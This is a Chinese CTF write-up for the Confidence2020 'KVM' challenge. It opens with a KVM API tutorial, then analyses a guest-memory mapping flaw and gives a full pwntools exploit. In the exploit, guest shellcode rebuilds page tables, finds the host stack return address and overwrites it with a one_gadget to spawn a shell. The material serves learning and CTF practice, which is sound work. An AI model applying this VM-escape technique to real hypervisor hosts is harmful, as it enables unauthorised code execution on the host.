# Confidence2020 CTF KVM

## 前置知识

参考链接：https://lwn.net/Articles/658511/

### 构建虚拟机 

```c
kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC);
```

我们需要对设备的读写访问来设置虚拟机，并且所有打开不是明确打算跨`exec`继承的，应使用 `O_CLOEXEC`。

### 创建一个虚拟机

```c
vmfd = ioctl(kvm, KVM_CREATE_VM, (unsigned long)0);
```

现在创建一个虚拟机，它代表与模拟出来的系统所有相关联的内容，包括内存，一或多个CPU。

```c
int ioctl(int fd, ind cmd, …)； 
```

**ioctl** 是设备驱动程序中对设备I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。

- **fd** 是用户程序打开设备时使用**open函数返回的文件标示符**。
- **cmd** 是用户程序对设备的控制命令。
- **省略号**是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。

### 分配内存

现在虚拟机需要分配一些内存。**分配的内存就相当于虚拟机的物理内存**，为了提高性能，我们不想捕获所有对于内存的访问并且模拟的返回它对应的地址；相反的是，当虚拟CPU试图访问内存的时候，CPU的硬件虚拟化会首先对尝试通过设置的内存页表来满足对内存的访问，如果失败了（由于虚拟机访问的是"物理"地址，而内存没有映射到该地址），那么内核就会使用KVM API 来处理这个访问，例如通过模拟内存映射的I/O设备或者产生一个错误。

对于我们的例子，我们分配了单独的页来存放我们的代码，使用mmap()直接获得初始化为0的页面对齐的内存

```c
mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
```

我们需要复制我们的机器代码到这个分配的空间内：

```c
memcpy(mem, code, sizeof(code));
```

然后告诉虚拟机它有足够大的4096个字节的内存：

```c
struct kvm_userspace_memory_region region = {
	.slot = 0,
	.guest_phys_addr = 0x1000,
	.memory_size = 0x1000,
	.userspace_addr = (uint64_t)mem,
};

ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &region);
```

- **slot** 字段提供了一个整数索引，用于标识我们要移交给KVM的每个内存区域，再次使用相同的 slot 调用KVM_SET_USER_MEMORY_REGION将替换此映射，如果使用不同的 slot 就会创建一个新的单独的映射。
- **guest_phys_addr** 字段指定物理地址的基址。
- **memory_size** 字段指定我们要分配多大的内存。
- **userspace_addr** 字段指向我们使用mmap() 分配的后备内存，需要注意的是这个值总是64位的即使在32位平台上也是64位的，还有一点就是这里要求 mem 是页对齐的，这也就是为什么上面mmap的时候要分配一个页对齐的页。 

### 创建虚拟CPU

现在我们有一个VM并且VM中包含我们的代码，并且代码正等待运行，所以我们需要一个虚拟CPU来运行代码，KVM的虚拟CPU代表模拟CPU的状态，包括进程寄存器和其他的执行状态。

同样，KVM以文件描述符的形式为我们提供该VCPU的句柄：

```c
vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (unsigned long)0);
```

第三个参数 0 代表虚拟CPU的索引，具有多个CPU的VM将在此处分配一系列标识符，从0到系统特定的限制（可通过使用KVM_CHECK_EXTENSION检查KVM_CAP_MAX_VCPUS功能来获得）

### 为CPU分配内存

每个CPU都有一个关联的`struct kvm_run`的数据结构，用于CPU在内核和用户空间的信息交换，特别是，无论何时硬件虚拟化停止了，例如模拟的一些虚拟硬件，`kvm_run`结构将会包含为什么停止的信息，我们使用mmap映射它到用户内存空间内，但是首先我们需要知道分配多少内存，KVM通过KVM_GET_VCPU_MMAP_SIZE ioctl来告诉我们

```c
mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, NULL);
```

需要注意的是分配的内存通常都是大于`kvm_run`的大小的，因为内核还将使用该空间来存储`kvm_run`可能指向的其他瞬时结构。

现在我们已经知道了应该分配的size，我们可以使用mmap来映射这个`kvm_run`结构了

```c
run = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, 0);
```

### 设置标准和特殊寄存器

VCPU也包含进程的寄存器状态，分为两组寄存器，一组是标准寄存器，一组是特殊寄存器。这两种寄存器对印这两个特定体系的数据结构 `struct kvm_regs` 和 `struct kvm_sregs`。在x86上，标准寄存器包括通用寄存器以及指令指针和标志。"特殊"寄存器主要包括段寄存器和控制寄存器。

在我们开始运行我们的代码之前，我们应该要先初始化这些寄存器，对于特殊寄存器我们只需要更改 cs 段寄存器，cs 段寄存器的默认状态（以及初始指令指针）指向复位向量，位于内存顶部下方16个字节处，但我们希望 cs 改为指向0，`kvm_sregs`中的每个段都包含一个完整的段描述符；我们不需要更改各种标志或限制，但是我们将 cs 的 base 和 selector 归零，这两个字段共同确定段指向的内存地址。为了避免更改任何其他初始"特殊"寄存器状态，我们将其读出，更改 cs 并将其写回：

```c
ioctl(vcpufd, KVM_GET_SREGS, &sregs);
sregs.cs.base = 0;
sregs.cs.selector = 0;
ioctl(vcpufd, KVM_SET_SREGS, &sregs);
```

对于标准寄存器，除了初始指令指针（指向代码0x1000，相对于 cs 指向0），加数（2和2）以及标志的初始状态（由x86架构指定为0x2；如果未设置此选项，则启动VM将会失败）：

```c
struct kvm_regs regs = {
	.rip = 0x1000,
	.rax = 2,
	.rbx = 2,
	.rflags = 0x2,
};

ioctl(vcpufd, KVM_SET_REGS, &regs);
```

### 开始运行

现在我们VM和VCPU以及初始化好了，内存映射也初始化好了，寄存器也都初始化好了，现在可以使用`kvm_run ioctl()`运行代码了，每当虚拟化停止时，这将成功返回，例如让我们模拟硬件，因此我们将其循环运行。

```c
while (1) {
	ioctl(vcpufd, KVM_RUN, NULL);
	switch (run->exit_reason) {
	/* Handle exit */
	}
}
```

注意，`KVM_RUN`在当前进程的上下文运行VM，并且知道仿真停止后才返回。要运行多个VM，用户空间进程必须产生多个线程，并为不同线程中的不同虚拟CPU调用`KVM_RUN`。

### 处理退出

我们通过检测`run->exit_reason`来看为什么退出，`run->exit_reason`包含了数十个退出原因中的一个，对应与`kvm_run`中联合的不同分支。

对于这个简单的VM，我们只处理其中的几个，并将其他的`exit_reason`视为错误。

我们将暂停视为以及结束的标志

```c
case KVM_EXIT_HLT:
	puts("KVM_EXIT_HLT");
	return 0;
```

为了让虚拟代码输出结果，我们在I/O端口0x3f8上模拟了一个串行端口。 run-> io中的字段指示方向（输入或输出），大小（1、2或4），端口和值的数量。为了传递实际数据，内核使用在kvm_run结构之后映射的缓冲区，并且run-> io.data_offset提供从该映射开始的偏移量。

```c
case KVM_EXIT_IO:
	if (run->io.direction == KVM_EXIT_IO_OUT &&
			run->io.size == 1 &&
			run->io.port == 0x3f8 &&
			run->io.count == 1)
		putchar(*(((char *)run) + run->io.data_offset));
	else
		errx(1, "unhandled KVM_EXIT_IO");
	break;
```

为了简化调试设置和运行VM的过程，我们处理了一些常见的错误。特别是，KVM_EXIT_FAIL_ENTRY在更改VM的初始条件时经常显示；这表明底层硬件虚拟化机制（在这种情况下为VT）无法启动VM，因为初始条件不符合其要求。 （在其他原因中，如果标志寄存器未设置0x2位，或者段或任务切换寄存器的初始值未通过各种设置条件，则将发生此错误。）hardware_entry_failure_reason实际上并不能区分很多情况，因此，此类错误通常需要仔细阅读硬件文档。

```c
case KVM_EXIT_FAIL_ENTRY:
	errx(1, "KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx",
		(unsigned long long)run->fail_entry.hardware_entry_failure_reason);
```

当我们将所有这些放到示例代码中，对其进行构建并运行时，我们得到以下信息：

```csharp
$ ./kvmtest
4
KVM_EXIT_HLT
```

## 题目分析

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int errno_kvm; // eax
  int errno_create_kvm; // eax
  int errno_set_user_memory; // eax
  int errno_create_vcpu; // eax
  int errno_set_regs; // eax
  int errno_get_sregs; // eax
  int errno_set_sregs; // eax
  __u32 exit_reason; // eax
  unsigned int code_size; // [rsp+Ch] [rbp-8274h]
  int kvmfd; // [rsp+10h] [rbp-8270h]
  int vmfd; // [rsp+14h] [rbp-826Ch]
  int vcpu; // [rsp+18h] [rbp-8268h]
  int v16; // [rsp+1Ch] [rbp-8264h]
  char *aligned_guest_mem; // [rsp+20h] [rbp-8260h]
  size_t vcpu_mmap_size; // [rsp+28h] [rbp-8258h]
  kvm_run *run_mem; // [rsp+30h] [rbp-8250h]
  __int64 v20; // [rsp+38h] [rbp-8248h]
  __int64 v21; // [rsp+40h] [rbp-8240h]
  __int64 v22; // [rsp+48h] [rbp-8238h]
  __u64 v23; // [rsp+50h] [rbp-8230h]
  __u64 v24; // [rsp+58h] [rbp-8228h]
  __int64 v25; // [rsp+60h] [rbp-8220h]
  __int64 v26; // [rsp+68h] [rbp-8218h]
  __int64 v27; // [rsp+70h] [rbp-8210h]
  kvm_userspace_memory_region region; // [rsp+80h] [rbp-8200h]
  kvm_regs guest_regs; // [rsp+A0h] [rbp-81E0h]
  kvm_sregs guest_sregs; // [rsp+130h] [rbp-8150h]
  char guest_mem[32776]; // [rsp+270h] [rbp-8010h]
  unsigned __int64 v32; // [rsp+8278h] [rbp-8h]
  __int64 savedregs; // [rsp+8280h] [rbp+0h]

  v32 = __readfsqword(0x28u);
  memset(guest_mem, 0, 0x8000uLL);
  aligned_guest_mem = &guest_mem[4096LL - ((&savedregs + 0x7FF0) & 0xFFF)];// 
                                                // 经过动调发现savedregs+0x7ff0其实就是刚才memset里面s的位置
                                                // 然后((&savedregs + 0x7ff0) & 0xfff)就是取s的地址的低3位
                                                // 然后用0x1000减掉低三位得到一个值,这个值也就是地址加多少可以取到最近的整数
                                                // 所以说这里的功能是让aligned_guest_mem取整
                                                // 举个例子就是假如guest_mem的起始地址为0x7fffffff5c50
                                                // 让他取整就是取到0x7fffffff6000
  code_size = -1;
  read_n(4LL, &code_size);                      // 这里需要输入的字符转成对应的数字需要小于0x4000,所以说输入的就应该是\x00\x40\x00\x00
  if ( code_size <= 0x4000 )
  {
    read_n(code_size, aligned_guest_mem);       // 如果按照上面咱们输入的\x00\x40\x00\x00的话,咱们就需要输入0x4000个字符
                                                // 然后这些字符存储到aligned_guest_mem中
    kvmfd = open("/dev/kvm", 0x80002);
    if ( kvmfd < 0 )
    {
      errno_kvm = open("/dev/kvm", 0x80002);
      kvmfd = errno_kvm;
      err(errno_kvm, "fail line: %d", 40LL);
    }
    // 0xAE01 : KVM_CREATE_VM
    vmfd = ioctl(kvmfd, 0xAE01uLL, 0LL);        // 创建虚拟机，获取到虚拟机句柄
    if ( vmfd < 0 )
    {
      errno_create_kvm = ioctl(kvmfd, 0xAE01uLL, 0LL);
      vmfd = errno_create_kvm;
      err(errno_create_kvm, "fail line: %d", 43LL);
    }
    region.slot = 0LL;
    region.guest_phys_addr = 0LL;
    region.memory_size = 0x8000LL;
    region.userspace_addr = aligned_guest_mem;
    // 0x4020ae46 : KVM_SET_USER_MEMORY_REGION
    if ( ioctl(vmfd, 0x4020AE46uLL, &region) < 0 )// 为虚拟机映射内存,还有其他的PCI,信号处理的初始化
    {
      errno_set_user_memory = ioctl(vmfd, 0x4020AE46uLL, &region);
      err(errno_set_user_memory, "fail line: %d", 52LL);
    }
    // 0xae41 : KVM_CREATE_VCPU
    vcpu = ioctl(vmfd, 0xAE41uLL, 0LL);         // 创建vCPU
    if ( vcpu < 0 )
    {
      errno_create_vcpu = ioctl(vmfd, 0xAE41uLL, 0LL);
      vcpu = errno_create_vcpu;
      err(errno_create_vcpu, "fail line: %d", 55LL);
    }

    // 0xAE04uLL : KVM_GET_VCPU_MMAP_SIZE
    vcpu_mmap_size = ioctl(kvmfd, 0xAE04uLL, 0LL);// 为vCPU分配内存空间
    run_mem = mmap(0LL, vcpu_mmap_size, 3, 1, vcpu, 0LL);
    memset(&guest_regs, 0, sizeof(guest_regs));
    guest_regs._rsp = 0xFF0LL;
    guest_regs.rflags = 2LL;
    // 0x4090ae82 : KVM_SET_REGS
    if ( ioctl(vcpu, 0x4090AE82uLL, &guest_regs) < 0 )// 设置寄存器
    {
      errno_set_regs = ioctl(vcpu, 0x4090AE82uLL, &guest_regs);
      err(errno_set_regs, "fail line: %d", 66LL);
    }
    // 0x8138AE83uLL : KVM_GET_SREGS
    if ( ioctl(vcpu, 0x8138AE83uLL, &guest_sregs) < 0 )// 获取特殊寄存器
    {
      errno_get_sregs = ioctl(vcpu, 0x8138AE83uLL, &guest_sregs);
      err(errno_get_sregs, "fail line: %d", 69LL);
    }
    v20 = 0x7000LL;
    v21 = 0x6000LL;
    v22 = 0x5000LL;
    v23 = 0x4000LL;
    *(aligned_guest_mem + 0xE00) = 3LL;         // 设置4级页表,因为cr0对应的第31位的值为1,所以说开启了分页机制所以就需要设置4级页表
                                                // 这里看了一眼汇编代码这里虽然加的是0xe00,但是对应汇编代码加的还是0x7000
    *&aligned_guest_mem[v20 + 8] = 0x1003LL;
    *&aligned_guest_mem[v20 + 16] = 0x2003LL;
    *&aligned_guest_mem[v20 + 24] = 0x3003LL;
    *&aligned_guest_mem[v21] = v20 | 3;
    *&aligned_guest_mem[v22] = v21 | 3;
    *&aligned_guest_mem[v23] = v22 | 3;
    v25 = 0LL;
    v26 = 0x1030010FFFFFFFFLL;
    v27 = 0x101010000LL;
    guest_sregs.cr3 = v23;
    guest_sregs.cr4 = 32LL;
    guest_sregs.cr0 = 0x80050033LL;
    guest_sregs.efer = 0x500LL;
    guest_sregs.cs.base = 0LL;
    *&guest_sregs.cs.limit = 0x10B0008FFFFFFFFLL;
    *&guest_sregs.cs.dpl = 0x101010000LL;
    guest_sregs.ss.base = 0LL;
    *&guest_sregs.ss.limit = 0x1030010FFFFFFFFLL;
    *&guest_sregs.ss.dpl = 0x101010000LL;
    guest_sregs.gs.base = 0LL;
    *&guest_sregs.gs.limit = 0x1030010FFFFFFFFLL;
    *&guest_sregs.gs.dpl = 0x101010000LL;
    guest_sregs.fs.base = 0LL;
    *&guest_sregs.fs.limit = 0x1030010FFFFFFFFLL;
    *&guest_sregs.fs.dpl = 0x101010000LL;
    guest_sregs.es.base = 0LL;
    *&guest_sregs.es.limit = 0x1030010FFFFFFFFLL;
    *&guest_sregs.es.dpl = 0x101010000LL;
    guest_sregs.ds.base = 0LL;
    *&guest_sregs.ds.limit = 0x1030010FFFFFFFFLL;
    *&guest_sregs.ds.dpl = 0x101010000LL;
    // 0x4138AE84 : KVM_SET_SREGS
    if ( ioctl(vcpu, 0x4138AE84uLL, &guest_sregs) < 0 )// 设置特殊寄存器
    {
      errno_set_sregs = ioctl(vcpu, 0x4138AE84uLL, &guest_sregs);
      err(errno_set_sregs, "fail line: %d", 105LL);
    }
    // 0xae80 : KVM_RUN
    while ( 1 )
    {
      ioctl(vcpu, 0xAE80uLL, 0LL);              // 开始运行虚拟机
      exit_reason = run_mem->exit_reason;
      if ( exit_reason == 5 || exit_reason == 8 )// KVM_EXIT_HLT | KVM_EXIT_SHUTDOWN
        break;
      if ( exit_reason == 2 )                   // KVM_EXIT_IO
      {
        if ( run_mem->io.direction == 1 && run_mem->io.port == 0x3F8 )
        {
          v16 = run_mem->io.size;
          v24 = run_mem->io.data_offset;
          printf("%.*s", v16 * run_mem->ex.error_code, run_mem + v24);
        }
      }
      else
      {
        printf("\n[loop] exit reason: %d\n", run_mem->exit_reason);
      }
    }
    puts("\n[loop] goodbye!");
    result = 0;
  }
  else
  {
    puts("[init] hold your horses");
    result = 1;
  }
  return result;
}
```

**漏洞点：**

```c
memset(guest_mem, 0, 0x8000uLL);
aligned_guest_mem = &guest_mem[4096LL - ((&savedregs + 0x7FF0) & 0xFFF)];

region.slot = 0LL;
region.guest_phys_addr = 0LL;
region.memory_size = 0x8000LL;
region.userspace_addr = aligned_guest_mem;
```

从上面的代码可以看出程序预计给虚拟机分配0x8000大小的空间，然后进行了个对齐操作使得分配的真实地址为aligned_guest_mem，然后后面实际再给虚拟机分配的时候还是分配了0x8000大小的空间，这样就会导致虚拟机越界读到了主机的内存。

首先我们看到我们memset的地址如下

![image-20200925224629609.png](https://i.loli.net/2020/09/25/vHc9aoD4Smt6XAw.png)

对齐后的地址如下。

![image-20200925224707504.png](https://i.loli.net/2020/09/25/zHNjYs5uEqfrtDx.png)

通过动态调试我们发现返回地址所在地址`(0x7FFFFFFFDE68)`包含在`aligned_guest_mem(0x7FFFFFFF6000)`到`aligned_guest_mem+0x8000(0x7FFFFFFFE000)`内，注意此处的aligned_guest_mem是通过分配host的栈空间作为VM的进程空间。对于host来说地址是`aligned_guest_mem`到`aligned_guest_mem+0x8000`，而对于虚拟机来说地址是`0`到`0x8000`。

![image-20200925225217368.png](https://i.loli.net/2020/09/25/EPRjwCrOscaJSbm.png)

用下图来更清晰的表示。

![image-20200925224348738.png](https://i.loli.net/2020/09/25/9UJeq7CaGh4d3ID.png)

然后程序有两个输入点，第一个输入的值会作为第二个输入点的可输入长度然后第二个输入点，输入的内容可以作为shellcode执行。

下面就是利用这个地方，在动调的过程中可以发现最后main返回的地址是存储在over这个区域的，所以就需要对存储返回地址的地方进行写操作，写成onegadget的地址就可以拿到shell了，写操作需要注意的就是[0x1000]这样读0x1000地址存储的内容不一定会读到0x1000，因为有分页机制所以虚拟地址需要转换成物理地址才可以使用，还需要注意一点的是64位环境下使用的是4级页表是48位，然后分为9、9、9、12四段，如下图所示。

![image-20200925230016886.png](https://i.loli.net/2020/09/25/N2RVtIPu9kFXejn.png)

根据这四段来获取到物理地址所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址。

具体的做法就是**更改cr3的值**，**自己构造4级页表**，**促使[0x1000]这样访问到的内存就是0x7000地址处的内存**，这里访问到0x7000是因为0x7000到0x8000包含了越界的部分，所以我们只需要循环遍历0x7000到0x8000以便找到ebp，从而控制执行流，其中页表的访问方式就应该是这样的，用我手画的图表示如下（以访问0x1000为例）：

![image-20200925230906050.png](https://i.loli.net/2020/09/25/ZGhBCqprunD48x5.png)

后面的0x1003、0x2003、0x3003等在ida中可看到。

```c
v20 = 0x7000LL;
v21 = 0x6000LL;
v22 = 0x5000LL;
v23 = 0x4000LL;
*(aligned_guest_mem + 0xE00) = 3LL;
*&aligned_guest_mem[v20 + 8] = 0x1003LL;
*&aligned_guest_mem[v20 + 16] = 0x2003LL;
*&aligned_guest_mem[v20 + 24] = 0x3003LL;
```

所以我们的shellcode就需要确保经过转换后的地址对应着的是返回地址，然后把返回地址改成oengadget就可以拿到shell了。

exp最开始设置访问的地址是0x1020，然后一直循环访问到对应地址存储的内容不是0的地方，经过动调发现在retun的返回地址前只有3个地址是有内容的，再往前看都是0，所以循环结束后访问的地址就是return的返回地址-3，所以要修改retuen的地址就需要+3，然后把这个地址里面的内容修改成one_gadget就可以拿到shell了。

```python
from pwn import *
context.arch = 'amd64'
p = process("./kvm")
elf = ELF("./kvm")
payload = asm(
    """
    mov qword ptr [0x1000], 0x2003
    mov qword ptr [0x2000], 0x3003
    mov qword ptr [0x3000], 0x0003
    mov qword ptr [0x0], 0x3
    mov qword ptr [0x8], 0x7003

    mov rax, 0x1000
    mov cr3, rax

    mov rcx, 0x1020
#############search ret#############
look_for_ra:   
    add rcx, 8
    cmp qword ptr [rcx], 0
    je look_for_ra

    add rcx, 24
#############overwrite ret#############
overwrite_ra:  
    mov rax, qword ptr [rcx]
    add rax, 0x249e6
    mov qword ptr [rcx], rax
    hlt
    """
)
log.success('len = '+str(len(payload)))
p.send("\x68\x00\x00\x00")
p.sendline(payload)
#gdb.attach(p)
p.recv(16)
#gdb.attach(p)
p.interactive()
```

对于exp几个疑惑的点：

- 0x1020 ：这里我本来写的是0x1000，但是没打通，在0x7000开始处我们写了四个字段，所以我们应该先跳过这四个字段开始，经过动态调试发现返回地址只有前面三个字段有内容，其他都是0，所以一次遍历到不为0为止，然后我们add 24，跳过这三个字段就能到达ret处。

  ![image-20200925232304528.png](https://i.loli.net/2020/09/25/tph8ysFVoinqW1f.png)

- 0x249e6 : 这里是返回地址到one_gadget地址的偏移，动态调试后发现execve_addr-ret_addr=0x249e6。

成功利用截图：

![image-20200925232856994.png](https://i.loli.net/2020/09/25/T2rDMolGOvBZkJI.png)